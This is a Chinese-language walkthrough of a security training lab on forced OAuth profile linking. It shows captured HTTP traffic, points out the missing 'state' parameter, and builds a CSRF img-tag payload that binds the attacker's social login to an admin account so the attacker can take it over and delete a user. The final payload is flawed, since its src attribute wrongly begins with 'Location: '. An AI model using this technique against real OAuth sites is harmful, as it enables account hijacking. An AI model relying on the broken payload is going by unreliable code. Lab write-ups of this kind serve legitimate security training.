# 实验：强制 OAuth 个人资料关联

本实验为您提供了将社交媒体个人资料关联到您的账户的选项，以便您可以通过 OAuth 登录，而无需使用常规用户名和密码。由于客户端应用程序对 OAuth 流程的实现不安全，攻击者可以操纵此功能以获取对其他用户账户的访问权限。

要解决本实验，请使用 CSRF 攻击将您自己的社交媒体个人资料关联到博客网站上管理员用户的账户，然后访问管理面板并删除 `carlos`。

管理员用户会打开您从 exploit server 发送的任何内容，并且他们始终在博客网站上拥有活动会话。

您可以使用以下凭据登录自己的账户：

- 博客网站账户：`wiener:peter`
- 社交媒体个人资料：`peter.wiener:hotdog`

## 步骤

使用 OAuth 登录功能
- 观察初始授权登录请求
    ```http
    GET /auth?client_id=kuaisp4a7j3ss7c0d4045&redirect_uri=https://id.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email HTTP/1.1
    Host: oauth-id.oauth-server.net
    ```
    - `response_type=code` 
        应用程序使用授权码模式
    - 无会话状态 hash 参数 `state`

- 最后，授权服务器返回服务器端重定向。授权令牌包含在回调 URL 的请求参数中
    ```http
    HTTP/2 302 Found
    Set-Cookie: _interaction_resume=; path=/auth/HhshKKiRnuqQ88dmOvUBB; expires=Thu, 01 Jan 1970 00:00:00 GMT; samesite=lax; secure; httponly
    Set-Cookie: _session=guuClvviXI1KM0jEKQLVT; path=/; expires=Sat, 29 Aug 2026 08:46:57 GMT; samesite=none; secure; httponly
    Set-Cookie: _session.legacy=guuClvviXI1KM0jEKQLVT; path=/; expires=Sat, 29 Aug 2026 08:46:57 GMT; secure; httponly
    Location: https://id.web-security-academy.net/oauth-login?code=rXNFOjYY_ccnVo6aqJVfH4QjpMabnQqIvYJ1X0cBCIO

    Redirecting to https://id.web-security-academy.net/oauth-login?code=rXNFOjYY_ccnVo6aqJVfH4QjpMabnQqIvYJ1X0cBCIO.
    ```

- 浏览器访问应用程序的回调端点
    ```http
    GET /oauth-login?code=rXNFOjYY_ccnVo6aqJVfH4QjpMabnQqIvYJ1X0cBCIO HTTP/2
    Host: id.web-security-academy.net
    ```

- 应用程序设置会话 cookie

测试登出后的授权服务器快速重定向回调
- 浏览器初始请求
    ```http
    GET /auth?client_id=kuaisp4a7j3ss7c0d4045&redirect_uri=https://id.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email HTTP/1.1
    Host: oauth-id.oauth-server.net
    Cookie: _session=guuClvviXI1KM0jEKQLVT; _session.legacy=guuClvviXI1KM0jEKQLVT
    ```

- 授权服务器响应
    ```http
    HTTP/2 302 Found
    Location: https://id.web-security-academy.net/oauth-login?code=FCzuKADF2Rzj8avODa7Sttrj-PNINrV-T4MJ0X7i3ar
    Set-Cookie: _session=guuClvviXI1KM0jEKQLVT; path=/; expires=Sat, 29 Aug 2026 08:59:41 GMT; samesite=none; secure; httponly
    Set-Cookie: _session.legacy=guuClvviXI1KM0jEKQLVT; path=/; expires=Sat, 29 Aug 2026 08:59:41 GMT; secure; httponly

    Redirecting to https://id.web-security-academy.net/oauth-login?code=FCzuKADF2Rzj8avODa7Sttrj-PNINrV-T4MJ0X7i3ar.
    ```

- 浏览器访问应用程序的回调端点
    ```http
    GET /oauth-login?code=FCzuKADF2Rzj8avODa7Sttrj-PNINrV-T4MJ0X7i3ar HTTP/2
    Host: id.web-security-academy.net
    ```
- 应用程序设置会话 cookie

- 流程简述：访问授权服务器时自动携带通过验证的 cookie，授权服务器快速返回回调 URL，浏览器向应用程序授权端点提交授权令牌，应用程序返回会话 cookie

尝试使用应用程序凭据登录
- 发现关联社交媒体账户功能
    ```http
    GET /auth?client_id=kuaisp4a7j3ss7c0d4045&redirect_uri=https://id.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/2
    Host: oauth-id.oauth-server.net
    Cookie: _session=guuClvviXI1KM0jEKQLVT; _session.legacy=guuClvviXI1KM0jEKQLVT
    ```
    - 此处的应用程序回调端点为 `oauth-linking`
    - 无会话状态 hash 参数 `state`

- 授权服务器返回服务器端重定向到应用程序回调端点 `oauth-linking`
    ```http
    HTTP/2 302 Found
    Location: https://id.web-security-academy.net/oauth-linking?code=jgxNnKHmnJySTB0RCvcSzQr7EFvHNr1v40vrvSgLt9K
    ```

- 浏览器向应用程序回调端点使用授权令牌，携带当前会话 cookie 以进行绑定
    ```http
    GET /oauth-linking?code=jgxNnKHmnJySTB0RCvcSzQr7EFvHNr1v40vrvSgLt9K HTTP/2
    Host: id.web-security-academy.net
    Cookie: session=MMZyTBbtvpEqr3l9MZQiyOFziOCceIgw
    ```

- 过程中不存在会话状态 hash 参数 `state`，尝试获得一个授权服务器返回的有效授权令牌但不提交到应用程序，使用 CSRF 向应用程序授权端点提交，即可绑定攻击者的社交账户到目标用户的应用程序账户


从实验描述得知此为钓鱼场景，管理员将打开收到的内容（URL 链接）
- 在重复器执行快速授权请求，提取授权服务器的回调 URL
    ```http
    Location: https://id.web-security-academy.net/oauth-linking?code=em9AoK2n-MZuz982-sgpfwrn14_DYTJtECFtbbv2SCp
    ```

- 构造攻击载荷

    ```html
    <img src="Location: https://id.web-security-academy.net/oauth-linking?code=em9AoK2n-MZuz982-sgpfwrn14_DYTJtECFtbbv2SCp">
    ```

- 发送载荷页面 URL 到受害者
- 在受害者访问页面从而关联授权账户到其应用程序账户后，登录授权账户，此时以管理员身份登录，访问管理端点，执行删除功能
